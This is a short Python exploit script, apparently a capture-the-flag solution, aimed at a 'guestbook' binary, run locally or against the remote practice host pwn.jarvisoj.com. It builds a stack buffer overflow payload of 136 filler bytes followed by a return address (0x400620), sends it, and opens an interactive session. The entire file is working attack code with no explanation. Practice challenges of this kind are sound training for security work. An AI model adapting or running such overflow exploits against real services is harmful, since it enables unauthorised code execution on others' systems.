#!/usr/bin/env python
# encoding:utf-8

import sys
import zio

def getPayload():
    target = zio.l64(0x400620)
    payload = "A" * 128 + "B" * 8 + target
    return payload

def showHelp():
    print "Usage : "
    print "        python exploit.py [local|remote]"

def main():
    if len(sys.argv) != 2:
        showHelp()
        exit(1)
    if sys.argv[1] == "local":
        Io = zio.zio("./guestbook")
    elif sys.argv[1] == "remote":
        Io = zio.zio(("pwn.jarvisoj.com", 9877))
    else:
        showHelp()
        exit(2)
    Io.write(getPayload())
    Io.interact()

if __name__ == "__main__":
    main()
